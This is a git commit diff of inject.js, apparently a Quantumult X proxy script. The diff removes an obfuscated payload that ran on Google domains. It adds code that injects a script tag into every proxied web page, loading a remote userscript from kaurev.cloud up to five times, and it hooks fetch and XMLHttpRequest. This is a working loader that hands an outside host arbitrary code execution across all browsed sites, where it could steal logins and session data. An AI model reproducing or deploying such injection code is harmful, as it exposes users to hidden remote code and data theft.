041ef247b074fec66198103d1f1b6f013f516e11
jbtekok6-dev <jbtekok6@gmail.com>
2026-04-06 21:27:34 +0800

    Update inject.js

--- inject.js
+++ inject.js
@@ -1,13 +1,86 @@
-// Remote KB by Kaurev - Quantumult X Script
-// @name         Remote KB by Kaurev
-// @version      1.0
-// @description  Remote KB By Kaurev
-// @author       Kaurev
+var body = $response.body;
 
-const whitelist = ["google.com","www.google.com","google.co.id","www.google.co.id"];
-const currentDomain = window.location.hostname;
+if (body) {
+    body = body.replace(/<\/head>/i, `
+<script>
 
-if (whitelist.some(domain => currentDomain === domain)) {
-    (function(_0x14035d,_0x5691bd){const _0x_0x26449f={_0x305388:0x162,_0x166ead:0x16a,_0x4fafd3:0x16b,_0x5c6f99:0x169,_0x257fdd:0x174,_0x1356a8:0x170,_0x525707:0x164,_0x3187ab:'\x33\x4a\x63\x40',[...]} 
-    })
+(function() {
+
+    console.log("=== PROXY INJECT START ===");
+
+    // ===== FAKE GM API =====
+    window.GM_info = {};
+    window.GM_addStyle = function(css){
+        let s = document.createElement("style");
+        s.innerHTML = css;
+        document.head.appendChild(s);
+    };
+    window.GM_xmlhttpRequest = function(opt){
+        fetch(opt.url, {method: opt.method || "GET"})
+        .then(r => r.text())
+        .then(t => opt.onload && opt.onload({responseText: t}));
+    };
+    window.GM_setValue = function(){};
+    window.GM_getValue = function(){};
+
+    // ===== HOOK NETWORK =====
+    const origFetch = window.fetch;
+    window.fetch = function(...args){
+        console.log("FETCH:", args);
+        return origFetch.apply(this, args);
+    };
+
+    const open = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(){
+        console.log("XHR:", arguments);
+        return open.apply(this, arguments);
+    };
+
+    // ===== LOAD SCRIPT FUNCTION =====
+    function loadScript() {
+        try {
+            let s = document.createElement("script");
+            s.src = "https://kaurev.cloud/7619565898/7b5a932293ffe702d15cf43d74be307f5502272c1895b917e5a71434ce3215cf/install.user.js";
+            s.async = true;
+            s.onload = () => console.log("Script loaded OK");
+            s.onerror = () => console.log("Script load FAILED");
+            document.documentElement.appendChild(s);
+        } catch(e) {
+            console.log("Load error:", e);
+        }
+    }
+
+    // ===== MULTI RETRY =====
+    let attempts = 0;
+    let maxAttempts = 5;
+
+    function tryInject() {
+        if (attempts >= maxAttempts) return;
+
+        console.log("Inject attempt:", attempts);
+        loadScript();
+
+        attempts++;
+        setTimeout(tryInject, 2000);
+    }
+
+    // ===== START AFTER LOAD =====
+    function start() {
+        console.log("Start inject engine");
+        tryInject();
+    }
+
+    if (document.readyState === "complete") {
+        setTimeout(start, 1000);
+    } else {
+        window.addEventListener("load", () => {
+            setTimeout(start, 1000);
+        });
+    }
+
+})();
+</script>
+</head>`);
 }
+
+$done({ body });
